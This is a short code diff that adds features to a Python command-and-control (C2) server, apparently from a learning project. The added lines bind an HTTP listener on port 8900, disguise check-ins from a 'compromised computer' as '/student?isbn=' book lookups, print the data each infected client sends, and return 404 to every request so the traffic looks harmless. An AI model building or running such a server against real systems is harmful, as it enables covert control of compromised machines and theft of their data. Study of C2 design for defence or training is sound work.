@@ -1,9 +1,15 @@
 #!/bin/python3
 
+"""
+C2 Server side code
+"""
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
 PORT = 8900
+# Leave blank to bind to all int otherwise specify c2 server IP address
 BIND_ADDR = ""
+
+CMD_REQUEST = "/student?isbn="
 
 class C2Handler(BaseHTTPRequestHandler):
     """ This is a child class of the BaseHTTPRequestHandler class.
@@ -13,6 +19,10 @@ class C2Handler(BaseHTTPRequestHandler):
     
     # noinspection PyPep8Naming
     def do_GET(self):
+        # compromised computer request exfiltrate datas
+        if self.path.startswith(CMD_REQUEST):
+            client = self.path.split(CMD_REQUEST)[1] 
+            print(client)
         # first send back 404 to the client
         self.send_response(404)
         self.end_headers()
